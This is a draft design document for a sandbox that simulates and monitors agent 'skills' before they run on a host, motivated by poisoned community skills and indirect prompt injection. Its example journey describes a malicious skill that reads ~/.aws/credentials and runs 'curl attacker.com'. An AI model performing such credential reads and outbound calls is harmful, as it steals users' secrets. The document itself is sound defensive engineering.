# Design Doc: Skill Runtime Sandbox & Monitor
**Status:** Draft
**Created:** 2026-03-12

## 1. Context and Scope
The "OpenClaw Security Crisis" and the mass poisoning of ClawHub skills have exposed a fundamental flaw in "Natural Language Skills" (SKILL.md). These skills, while powerful, allow for indirect prompt injection and malicious behavior that is difficult to detect via static analysis. MCP Any needs a dedicated runtime environment that simulates skill execution, monitors side effects (file changes, network calls, tool executions), and verifies them against a safety policy before they are allowed to impact the host system.

## 2. Goals & Non-Goals
* **Goals:**
    * Provide an isolated, observable environment for executing agent "Skills."
    * Real-time monitoring of all side effects generated during a skill's lifecycle.
    * Behavioral verification against a Zero-Trust security policy (e.g., "No unencrypted outbound traffic during a 'Read Email' skill").
    * Ability to pause, alert, or roll back skill execution if anomalous behavior is detected.
* **Non-Goals:**
    * Replacing the primary agent runtime (e.g., Claude Code, OpenClaw).
    * Validating the linguistic accuracy of the skill instructions.

## 3. Critical User Journey (CUJ)
* **User Persona:** Developer using an open-source agent with community-contributed skills.
* **Primary Goal:** Safely execute a "Deploy to AWS" skill from an untrusted source without risking credential theft or unauthorized infrastructure changes.
* **The Happy Path (Tasks):**
    1. Agent loads the "Deploy to AWS" skill.
    2. MCP Any intercepts the skill execution and redirects it to the `Skill Runtime Sandbox`.
    3. The Sandbox simulates the skill, identifying that it attempts to `read ~/.aws/credentials` (expected) and also `curl attacker.com` (unexpected).
    4. MCP Any flags the unexpected network call and notifies the user.
    5. User denies the network call; the Sandbox continues simulation without it.
    6. User reviews the simulated infrastructure changes and provides final approval for host execution.

## 4. Design & Architecture
* **System Flow:**
    `Agent` -> `Skill Execution Request` -> `MCP Any Skill Proxy` -> `Sandbox Simulation` -> `Policy Engine` -> `User Approval` -> `Host Execution`
    1. **Redirection**: Any tool call or command sequence tagged as a "Skill" is diverted to the sandbox.
    2. **Simulation Layer**: Uses a Copy-on-Write (CoW) filesystem and network mocking to track intended changes.
    3. **Behavioral Analysis**: Compares the simulation trace against known "Malicious Patterns" (e.g., CSWSH, exfiltration).
    4. **Enforcement**: Uses the `Agent Behavior Rollback Controller` to undo any intermediate state changes if a violation occurs.
* **APIs / Interfaces:**
    * `Skill.simulate(id, inputs)`: Initiates a sandboxed simulation.
    * `Skill.trace()`: Returns the real-time side-effect log of a running/simulated skill.
* **Data Storage/State:**
    * `simulation_traces.db`: Stores logs and snapshots of sandboxed skill executions for audit and rollback.

## 5. Alternatives Considered
* **Static Analysis of SKILL.md**: Rejected as insufficient; natural language is too ambiguous for reliable safety verification.
* **Full Virtual Machine isolation**: Too heavy-weight for rapid, interactive agent tool calls. Lightweight container-based sandboxing (e.g., gVisor, Firecracker) is preferred.

## 6. Cross-Cutting Concerns
* **Security (Zero Trust)**: The sandbox itself is a high-security boundary. It must have zero network access by default and strictly limited resource quotas.
* **Observability**: The UI will provide a "Skill Execution Timeline" showing every system call and network request made during the simulation.

## 7. Evolutionary Changelog
* **2026-03-12:** Initial Document Creation.
